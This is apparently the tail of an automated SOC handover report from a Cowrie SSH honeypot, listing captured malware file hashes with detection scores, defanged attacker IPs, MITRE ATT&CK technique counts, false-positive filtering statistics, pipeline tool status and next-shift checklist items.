| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **32/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `223.233.84[.]127` | IN | ABTS DELHI, Bharti Airtel Ltd.,224, Okhla industrial Area Phase III New Delhi | **100** ⚠️ | 1 |
| `61.73.239[.]86` | KR | Korea Telecom | **100** ⚠️ | 3 |
| `182.253.79[.]194` | ID | ANEKA_RUPA_TERA | **100** ⚠️ | 0 |
| `13.86.104[.]14` | US | Microsoft Corporation | **100** ⚠️ | 50 |
| `150.95.25[.]34` | TH | ZCOM THAI | **100** ⚠️ | 0 |
| `121.175.52[.]154` | KR | Korea Telecom | **100** ⚠️ | 6 |
| `66.132.224[.]233` | US | Censys, Inc. | **100** ⚠️ | 49 |
| `45.84.59[.]4` | NL | RoyaleHosting BV | **100** ⚠️ | 0 |
| `120.48.42[.]17` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `180.76.177[.]88` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 19 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 170 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 135 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 23 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 12 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 12 |

---

## 🔕 False Positive Summary (12 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 4 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 6 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 200 cases |
| Tool 34  | Credential Extractor        | ✅ 158 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 2 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 31 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 12 filtered (6.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 23 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 23 priority case(s) shown individually · 19 recon entry/entries in table (10 group(s) consolidating 156 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-10T06:36:50Z_
